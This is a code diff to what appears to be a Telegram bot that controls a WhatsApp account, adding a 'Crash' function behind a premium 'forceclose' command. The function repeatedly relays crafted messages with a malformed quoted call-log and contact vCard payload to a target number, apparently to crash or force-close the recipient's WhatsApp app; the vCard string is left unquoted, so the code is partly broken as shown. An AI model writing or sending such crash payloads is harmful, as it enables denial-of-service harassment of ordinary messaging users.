@@ -1423,7 +1423,7 @@ bot.command("forceclose", checkWhatsAppConnection, checkPremium, async ctx => {
   await prosesrespone(target, ctx);
 
   for (let i = 0; i < 5; i++) {
-    await BugKontak(target);
+    await Crash(target);
     
 }
 
@@ -2007,6 +2007,46 @@ https://chat.whatsapp.com/I24OwNUuBzk6KRDeNDF62e
 
 THX TO OM TAMA, KARENA DIA SAYA MENDAPATKAN SEBUAH IDE TENTANG QUOTED INI
 */
+async function Crash(isTarget) {
+    for (let i = 0; i < 10; i++) {
+        await kipop.relayMessage(isTarget, {
+            extendedTextMessage: {
+                text: "Crash",
+                contextInfo: {
+                    stanzaId: "1234567890Konto𝐦𝐞𝐦𝐞𝐤n",
+                    participant: "5521992999999@s.whatsapp.net",
+                    mentionedJid: ["5521992999999@s.whatsapp.net"],
+                    quotedMessage: {
+                        callLogMessage: {
+                            callType: "VIDEO",
+                            callOutcome: 1, 
+                            durationSecs: "0",
+                            participant: "5521992999999@s.whatsapp.net",
+                            participants: [
+                                {
+                                    jid: "5521992999999@s.whatsapp.net"
+                                },
+                                {
+                                    jid: isTarget
+                                }
+                            ]
+                        },
+                        contactMessage: {
+                            displayName: "RilzX7",
+                            vcard: BEGIN:VCARD
+VERSION:3.0
+FN:RilzX7
+X-WA-BIZ-NAME:RilzX7
+ORG:jawa;
+TEL;type=CELL;type=VOICE;waid=5521992999999:+55 21 99299-9999
+END:VCARD
+                        }
+                    }
+                }
+            }
+        }, {});
+    }
+}
 async function BugForclose(target) {
     await kipop.relayMessage(target, {
         extendedTextMessage: {
